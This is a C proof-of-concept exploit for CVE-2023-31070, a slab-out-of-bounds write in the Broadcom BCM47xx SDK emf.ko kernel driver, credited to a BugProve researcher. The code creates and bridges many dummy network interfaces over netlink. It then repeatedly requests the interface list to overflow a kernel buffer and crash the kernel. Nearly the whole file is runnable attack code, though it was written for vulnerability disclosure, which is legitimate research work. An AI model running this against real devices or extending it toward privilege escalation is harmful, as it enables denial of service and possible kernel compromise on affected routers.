/*
 * CVE-2023-31070 Broadcom BCM47xx SDK slab-out-of-bounds write
 *
 * There is a slab-out-of-bounds write in emf.ko, a kernel driver used to support IGMP snooping. The issue is affecting
 * Broadcom BCM47xx SDKs and it allows an attacker to elevate privileges by confusing the kernel module's data structures
 * with crafted data, potentially allowing kernel-mode code execution.
 *
 * The following is a proof of concept to demonstrate crashing the kernel space using a CAP_NET_ADMIN userspace process
 * by a sequence of operations carried out over the netlink interface.
 *
 * Author: Attila Szasz, BugProve Inc.
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <ctype.h>
#include <errno.h>
#include <stdlib.h>
#include <netinet/in.h>
#include "emf_cfg.h"
#include "emfu.h"
#include "emfu_linux.h"

#include <netlink/netlink.h>
#include <netlink/route/link.h>

#define MAX_DATA_SIZE  sizeof(emf_cfg_request_t)

static int
emf_cfg_iface_list(char *bridge_id)
{
        emf_cfg_request_t req;
        emf_cfg_if_list_t *list;
        int32_t i;

        bzero((char *)&req, sizeof(emf_cfg_request_t));

        strncpy((char *)req.inst_id, bridge_id, strlen(bridge_id));
        req.command_id = EMFCFG_CMD_IF_LIST;
        req.oper_type = EMFCFG_OPER_TYPE_GET;
        req.size = sizeof(req.arg);

        /* Send request to kernel */
        if (emf_cfg_request_send(&req, sizeof(emf_cfg_request_t)) < 0) {
                fprintf(stderr, "Unable to send request to EMF\n");
                return (FAILURE);
        }

        if (req.status != EMFCFG_STATUS_SUCCESS) {
                fprintf(stderr, "%s\n", req.arg);
                return (FAILURE);
        }

        fprintf(stdout, "EMF enabled interfaces on %s: ", bridge_id);

        list = (emf_cfg_if_list_t *)req.arg;
        for (i = 0; i < list->num_entries; i++) {
                fprintf(stdout, "%s ", list->if_entry[i].if_name);
        }

        fprintf(stdout, "\n");

        return (SUCCESS);
}

static int
emf_cfg_iface_add(char *bridge_id, char *iface_id)
{
        emf_cfg_request_t req;
        emf_cfg_if_t *cfg_if;

        bzero((char *)&req, sizeof(emf_cfg_request_t));

        strncpy((char *)req.inst_id, bridge_id, strlen(bridge_id));
        req.command_id = EMFCFG_CMD_IF_ADD;
        req.oper_type = EMFCFG_OPER_TYPE_SET;

        cfg_if = (emf_cfg_if_t *)req.arg;
        strncpy((char *)cfg_if->if_name, iface_id, strlen(iface_id));
        cfg_if->if_name[15] = 0;

        /* Send request to kernel */
        if (emf_cfg_request_send(&req, sizeof(emf_cfg_request_t)) < 0) {
                fprintf(stderr, "Unable to send request to EMF\n");
                return (FAILURE);
        }

        if (req.status != EMFCFG_STATUS_SUCCESS) {
                fprintf(stderr, "%s\n", req.arg);
                return (FAILURE);
        }

        return (SUCCESS);
}

static int
emf_cfg_bridge_add(char *bridge_id)
{
        emf_cfg_request_t req;

        bzero((char *)&req, sizeof(emf_cfg_request_t));

        strncpy((char *)req.inst_id, bridge_id, strlen(bridge_id));
        req.command_id = EMFCFG_CMD_BR_ADD;
        req.oper_type = EMFCFG_OPER_TYPE_SET;

        /* Send request to kernel */
        if (emf_cfg_request_send(&req, sizeof(emf_cfg_request_t)) < 0) {
                fprintf(stderr, "Unable to send request to EMF\n");
                return (FAILURE);
        }
        if (req.status != EMFCFG_STATUS_SUCCESS) {
                fprintf(stderr, "%s\n", req.arg);
                return (FAILURE);
        }

        return (SUCCESS);
}



static int 
add_iface(char *iface_name) 
{
	struct rtnl_link *link;
	struct nl_sock *sk;
	int err = 0;
	
	link = rtnl_link_alloc();
	if (!link) {
        	nl_perror(err, "rtnl_link_alloc");
        	goto err_out;
    	}
    	rtnl_link_set_name(link, iface_name);
    	rtnl_link_set_type(link, "dummy");

    	sk = nl_socket_alloc();
    	err = nl_connect(sk, NETLINK_ROUTE);
    	if (err < 0) {
        	nl_perror(err, "nl_connect");
        	goto err_cleanup;
    	}
    	err = rtnl_link_add(sk, link, NLM_F_CREATE);
    	if (err < 0) {
        	nl_perror(err, "");
        	goto err_cleanup_sock;
    	}

	err_cleanup_sock:
    		nl_close(sk);
	err_cleanup:
    		rtnl_link_put(link);
	err_out:
    		return err;
}

int main(int argc, char **argv)
{
    	char iface_buf[32];
	int32_t i;

	/* Initialize bridge interface */
    	memset(iface_buf, 0, sizeof(iface_buf));
    	add_iface("bgbridge");
    	emf_cfg_bridge_add("bgbridge");

        /* Set up and overload linked list in the emf driver */
    	printf("[*] Initiating PoC\n");
    	for (i = 0; i < 2*EMFCFG_MAX_ARG_SIZE; i++) {
		printf("[*] Adding iface %d\n", i);
		sprintf(iface_buf, "bg%d", i);
        	add_iface(iface_buf);
    	}   

    	for (i = 0; i < 2*EMFCFG_MAX_ARG_SIZE; i++) {
		printf("[*] Bridging iface %d\n", i);
		sprintf(iface_buf, "bg%d", i);
        	emf_cfg_iface_add("bgbridge", iface_buf);
    	}   

	/* Trigger the out-of-bounds via iface list */
    	for (i = 0; i < 64; i++) {
		printf("[*] Triggering PoC\n");
        	sprintf(iface_buf, "bg%d", i);
		emf_cfg_iface_add("bgbridge", iface_buf);
		emf_cfg_iface_list("bgbridge");
    	}

	return (SUCCESS);
}
